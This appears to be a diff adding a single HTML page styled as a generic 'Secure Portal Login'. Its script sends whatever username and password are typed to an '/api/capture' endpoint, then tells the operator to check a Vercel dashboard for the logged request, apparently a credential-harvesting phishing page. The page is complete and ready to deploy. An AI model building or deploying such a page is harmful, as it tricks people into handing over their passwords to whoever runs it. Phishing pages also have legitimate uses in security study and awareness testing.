@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal Login</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-card {
+            background: #ffffff;
+            padding: 35px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            width: 100%;
+            max-width: 350px;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 24px;
+            color: #111827;
+            font-size: 22px;
+        }
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: #4b5563;
+            font-size: 14px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #1d4ed8;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <h2>Account Login</h2>
+    <form id="loginForm">
+        <div class="input-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" required autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" required autocomplete="off">
+        </div>
+        <button type="submit" class="btn">Log In</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const usernameVal = document.getElementById('username').value;
+        const passwordVal = document.getElementById('password').value;
+
+        try {
+            const response = await fetch('/api/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    user: usernameVal,
+                    pass: passwordVal
+                })
+            });
+
+            if (response.ok) {
+                alert('Request logged. Check Vercel Dashboard!');
+                document.getElementById('loginForm').reset();
+            } else {
+                alert('Error payload status: ' + response.status);
+            }
+        } catch (err) {
+            console.error('Network execution failure:', err);
+        }
+    });
+</script>
+
+</body>
+</html>
